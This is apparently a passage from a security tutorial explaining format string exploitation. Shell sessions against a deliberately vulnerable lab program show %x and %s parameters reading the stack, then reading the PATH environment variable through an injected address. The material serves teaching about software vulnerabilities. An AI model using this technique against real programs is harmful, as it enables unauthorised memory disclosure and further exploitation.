# *__Reading from Arbitrary Memory Addresses__*

The __%s__ format parameter can be used to read from arbitrary memory addresses. Since it’s possible to read the data of the original format string, part of the original format string can be used to supply an address to the __%s__ format parameter, as shown here:

<pre style="color: white;">
reader@hacking:~/booksrc $ ./fmt_vuln AAAA%08x.%08x.%08x.%08x
The right way to print user-controlled input:
AAAA%08x.%08x.%08x.%08x
The wrong way to print user-controlled input:
AAAAbffff3d0.b7fe75fc.00000000.41414141
[*] test_val @ 0x08049794 = -72 0xffffffb8
reader@hacking:~/booksrc $
</pre>

The four bytes of _0x41_ indicate that the fourth format parameter is reading from the beginning of the format string to get its data. If the fourth format parameter is __%s__ instead of __%x_, the format function will attempt to print the string located at _0x41414141_. This will cause the program to crash in a segmentation fault, since this isn’t a valid address. But if a valid memory address is used, this process could be used to read a string found at that memory address.

<pre style="color: white;">
reader@hacking:~/booksrc $ env | grep PATH
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
reader@hacking:~/booksrc $ ./getenvaddr PATH ./fmt_vuln
PATH will be at 0xbffffdd7
reader@hacking:~/booksrc $ ./fmt_vuln $(printf "\xd7\xfd\xff\xbf")%08x.%08x.%08x.%s
The right way to print user-controlled input:
????%08x.%08x.%08x.%s
The wrong way to print user-controlled input:
????bffff3d0.b7fe75fc.00000000./usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/
usr/games
[*] test_val @ 0x08049794 = -72 0xffffffb8
reader@hacking:~/booksrc $
</pre>

Here the _getenvaddr_ program is used to get the address for the environment variable _PATH_. Since the program name _fmt_vuln_ is two bytes less than _getenvaddr_, four is added to the address, and the bytes are reversed due to the byte ordering. The fourth format parameter of _%s_ reads from the beginning of the format string, thinking it’s the address that was passed as a function argument. Since this address is the address of the _PATH_ environment variable, it is printed as if a pointer to the environment variable were passed to _printf()_.

Now that the distance between the end of the stack frame and the beginning of the format string memory is known, the field-width arguments can be omitted in the _%x_ format parameters. These format parameters are only needed to step through memory. Using this technique, any memory address can be examined as a string.